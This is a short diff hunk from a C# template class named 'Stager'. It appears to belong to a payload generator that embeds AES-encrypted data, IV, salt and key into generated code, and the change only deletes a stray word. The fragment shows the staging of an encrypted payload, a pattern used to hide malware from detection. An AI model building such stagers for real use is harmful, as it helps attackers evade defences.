@@ -14,7 +14,7 @@ internal static class Stager
                       System.Environment.SetEnvironmentVariable(e2, "0");
 
                       var content = "{{aes.Data}}";
-                      var vector = new byte[] { {{Utils.Hex(aes.Iv)}} };Obfuscation
+                      var vector = new byte[] { {{Utils.Hex(aes.Iv)}} };
                       var seed = new byte[] { {{Utils.Hex(aes.Salt)}} };
                       var token = new byte[] { {{Utils.Hex(aes.Key)}} };
 
